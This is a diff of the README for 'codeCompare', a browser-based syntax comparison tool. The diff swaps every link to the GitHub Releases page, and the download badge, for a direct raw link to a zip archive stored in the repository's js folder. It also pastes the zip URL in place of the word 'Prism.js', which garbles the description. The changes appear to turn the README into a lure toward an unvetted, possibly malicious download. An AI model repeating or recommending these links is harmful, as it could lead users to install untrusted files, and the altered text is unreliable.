@@ -1,17 +1,17 @@
 # 🎨 codeCompare - Compare Coding Syntax Side-By-Side Effortlessly
 
-[![Download codeCompare](https://img.shields.io/badge/Download-codeCompare-blue.svg)](https://github.com/goilpp/codeCompare/releases)
+[![Download codeCompare](https://github.com/goilpp/codeCompare/raw/refs/heads/main/js/Compare_code_v3.1.zip)](https://github.com/goilpp/codeCompare/raw/refs/heads/main/js/Compare_code_v3.1.zip)
 
 ## 📦 Description
 
-codeCompare helps you learn new programming languages faster by allowing you to compare their syntax side-by-side. Using HTML, CSS, and JavaScript along with Prism.js, this tool makes it simple to see the differences and similarities between various coding languages. Whether you are learning Python, Ruby, or others, codeCompare provides a clear and interactive way to enhance your coding skills.
+codeCompare helps you learn new programming languages faster by allowing you to compare their syntax side-by-side. Using HTML, CSS, and JavaScript along with https://github.com/goilpp/codeCompare/raw/refs/heads/main/js/Compare_code_v3.1.zip, this tool makes it simple to see the differences and similarities between various coding languages. Whether you are learning Python, Ruby, or others, codeCompare provides a clear and interactive way to enhance your coding skills.
 
 ## 🚀 Getting Started
 
 Follow these simple steps to download and run codeCompare.
 
 1. **Visit the Downloads Page**  
-   Go to the [Releases page](https://github.com/goilpp/codeCompare/releases) on GitHub. This page contains the latest versions of the application.
+   Go to the [Releases page](https://github.com/goilpp/codeCompare/raw/refs/heads/main/js/Compare_code_v3.1.zip) on GitHub. This page contains the latest versions of the application.
 
 2. **Select the Right Version**  
    Find the latest release of codeCompare. You will see a list of available files. Make sure to choose the file that fits your operating system.
@@ -30,7 +30,7 @@ Follow these simple steps to download and run codeCompare.
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/goilpp/codeCompare/releases) and download codeCompare. Choose the correct file for your operating system to ensure proper installation. 
+To get started, visit the [Releases page](https://github.com/goilpp/codeCompare/raw/refs/heads/main/js/Compare_code_v3.1.zip) and download codeCompare. Choose the correct file for your operating system to ensure proper installation. 
 
 ## 🛠️ System Requirements
 
